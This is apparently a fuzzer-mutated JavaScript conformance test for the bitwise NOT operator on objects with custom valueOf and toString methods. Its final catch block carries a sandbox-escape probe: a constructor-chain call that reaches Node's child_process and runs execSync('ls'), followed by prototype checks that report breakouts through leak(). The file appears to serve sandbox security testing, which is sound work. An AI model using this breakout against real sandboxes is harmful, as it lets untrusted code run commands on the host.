try {
    var object = {
        valueOf: function () {
            let REPLACER = 23;
            return 1;
        }
    };
    if (~object !== -2) {
        $ERROR('#1: var object = {valueOf: function() {return 1}}; ~object === -2. Actual: ' + ~object);
    }
    var object = {
        valueOf: function () {
            let REPLACER = 23;
            return 1;
        },
        toString: function () {
            let REPLACER = 23;
            return 0;
        }
    };
    if (~object !== -2) {
        $ERROR('#2: var object = {valueOf: function() {return 1}, toString: function() {return 0}}; ~object === -2. Actual: ' + ~object);
    }
    var object = {
        valueOf: function () {
            let REPLACER = 23;
            return 1;
        },
        toString: function () {
            let REPLACER = 23;
            return {};
        }
    };
    if (~object !== -2) {
        $ERROR('#3: var object = {valueOf: function() {return 1}, toString: function() {return {}}}; ~object === -2. Actual: ' + ~object);
    }
    try {
        var object = {
            valueOf: function () {
                throw () => {
                    return () => {
                    };
                };
                return 1;
            },
            toString: function () {
                throw 'error';
            }
        };
        if (~object !== -2) {
            $ERROR('#4.1: var object = {valueOf: function() {return 1}, toString: function() {throw "error"}}; ~object === -2. Actual: ' + ~object);
        }
    } catch (e) {
        if (e === 'error') {
            $ERROR('#4.2: var object = {valueOf: function() {return 1}, toString: function() {throw "error"}}; ~object not throw "error"');
        } else {
            $ERROR('#4.3: var object = {valueOf: function() {return 1}, toString: function() {throw "error"}}; ~object not throw Error. Actual: ' + e);
        }
    }
    var object = {
        toString: function () {
            return 1;
        }
    };
    if (~object !== -2) {
        $ERROR('#5: var object = {toString: function() {return 1}}; ~object === -2. Actual: ' + ~object);
    }
    var object = {
        valueOf: function () {
            return {};
        },
        toString: function () {
            return 1;
        }
    };
    if (~object !== -2) {
        $ERROR('#6: var object = {valueOf: function() {return {}}, toString: function() {return 1}}; ~object === -2. Actual: ' + ~object);
    }
    try {
        var object = {
            valueOf: function () {
                throw 'error';
            },
            toString: function () {
                return 1;
            }
        };
        ~object;
        $ERROR('#7.1: var object = {valueOf: function() {throw "error"}, toString: function() {return 1}}; ~object throw "error". Actual: ' + ~object);
    } catch (e) {
        if (e !== 'error') {
            $ERROR('#7.2: var object = {valueOf: function() {throw "error"}, toString: function() {return 1}}; ~object throw "error". Actual: ' + e);
        }
    }
    try {
        var object = {
            valueOf: function () {
                return {};
            },
            toString: function () {
                return {};
            }
        };
        ~object;
        $ERROR('#8.1: var object = {valueOf: function() {return {}}, toString: function() {return {}}}; ~object throw TypeError. Actual: ' + ~object);
    } catch (e) {
        if (e instanceof TypeError !== true) {
            $ERROR('#8.2: var object = {valueOf: function() {return {}}, toString: function() {return {}}}; ~object throw TypeError. Actual: ' + e);
        }
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}